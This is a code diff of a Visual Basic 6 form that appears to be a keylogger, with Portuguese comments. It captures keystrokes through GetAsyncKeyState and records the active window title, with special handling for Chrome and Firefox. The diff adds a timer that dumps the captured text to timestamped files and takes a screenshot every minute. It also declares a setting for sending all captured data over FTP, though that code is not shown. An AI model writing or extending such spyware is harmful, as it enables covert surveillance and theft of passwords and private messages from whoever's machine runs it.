@@ -1,14 +1,19 @@
 VERSION 5.00
 Begin VB.Form Form1 
    Caption         =   "Form1"
-   ClientHeight    =   12015
-   ClientLeft      =   120
-   ClientTop       =   465
-   ClientWidth     =   20370
+   ClientHeight    =   4440
+   ClientLeft      =   165
+   ClientTop       =   555
+   ClientWidth     =   10545
    LinkTopic       =   "Form1"
-   ScaleHeight     =   12015
-   ScaleWidth      =   20370
+   ScaleHeight     =   4440
+   ScaleWidth      =   10545
    StartUpPosition =   3  'Windows Default
+   Begin VB.Timer Timer3 
+      Interval        =   1000
+      Left            =   5760
+      Top             =   3720
+   End
    Begin VB.Timer Timer2 
       Interval        =   1000
       Left            =   600
@@ -20,12 +25,12 @@ Begin VB.Form Form1
       Top             =   11280
    End
    Begin VB.TextBox Text1 
-      Height          =   10695
+      Height          =   3015
       Left            =   240
       MultiLine       =   -1  'True
       TabIndex        =   0
       Top             =   240
-      Width           =   19815
+      Width           =   10095
    End
 End
 Attribute VB_Name = "Form1"
@@ -33,12 +38,20 @@ Attribute VB_GlobalNameSpace = False
 Attribute VB_Creatable = False
 Attribute VB_PredeclaredId = True
 Attribute VB_Exposed = False
-Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
-    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long
+Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
+Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long
     
-Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer 'import para capturar numero da tecla pressionada
+Private Declare Function GetAsyncKeyState Lib "USER32" (ByVal vKey As Long) As Integer 'import para capturar numero da tecla pressionada
 Dim textbuffer_janela As String
 Dim num_janela As Long
+
+'used by timer which call write in disk function
+Dim ctd As Integer
+
+'time in minutes to perform the function that
+Const X_WRITE_DISK = 1  'write data in disk
+Const X_SCREENSHOT = 1  'take an screenshot
+Const X_SEND_FTP = 1 'send all captured data to ftp
 
 'read current window title
 Private Function GetActiveWindowTitle() As String
@@ -199,23 +212,45 @@ End Sub
 'If current active window is one browser the active window different rule is ignored.
 
 Private Sub Timer2_Timer()
-Dim verifica_aba
-Dim ler_janela As Boolean
-
-verifica_aba = InStr(1, GetActiveWindowTitle, "Chrome")
-If verifica_aba = 0 Then
-verifica_aba = InStr(1, GetActiveWindowTitle, "Firefox")
-End If
-
-If verifica_aba <> 0 Then
-ler_janela = True
-End If
-
-If (GetActiveWindowTitle <> textbuffer_janela) And ((GetForegroundWindow <> num_janela) Or (ler_janela = True)) Then
-num_janela = GetForegroundWindow
-textbuffer_janela = GetActiveWindowTitle
-Text1.Text = Text1.Text + vbCrLf + "{" + GetActiveWindowTitle + "}" + vbCrLf
-End If
+    Dim verifica_aba
+    Dim ler_janela As Boolean
+    
+    verifica_aba = InStr(1, GetActiveWindowTitle, "Chrome")
+    If verifica_aba = 0 Then
+        verifica_aba = InStr(1, GetActiveWindowTitle, "Firefox")
+    End If
+    
+    If verifica_aba <> 0 Then
+        ler_janela = True
+    End If
+    
+    If (GetActiveWindowTitle <> textbuffer_janela) And ((GetForegroundWindow <> num_janela) Or (ler_janela = True)) Then
+        num_janela = GetForegroundWindow
+        textbuffer_janela = GetActiveWindowTitle
+        Text1.Text = Text1.Text + vbCrLf + "{" + GetActiveWindowTitle + "}" + vbCrLf
+    End If
 
 End Sub
 
+Private Sub write_to_buffer()
+    Dim fso As New FileSystemObject
+    Dim arqtxt As TextStream
+    Set arqtxt = fso.CreateTextFile(App.Path + "/" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_"), True)
+    arqtxt.Write (Text1.Text)
+    Text1.Text = ""
+End Sub
+
+Private Sub take_a_screenshot()
+    SavePicture CaptureScreen(), App.Path + "/screenshot" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_")
+End Sub
+
+'this logical is simple
+'the time bellow execultes in a interval of one second
+'but he calls the function only every 60 * x executions
+'This is nescessary becouse the timer object in vb6 not support large intervals
+Private Sub Timer3_Timer()
+    ctd = ctd + 1
+    
+    If ctd Mod (60 * X_WRITE_DISK) = 0 Then write_to_buffer
+    If ctd Mod (60 * X_SCREENSHOT) = 0 Then take_a_screenshot
+End Sub
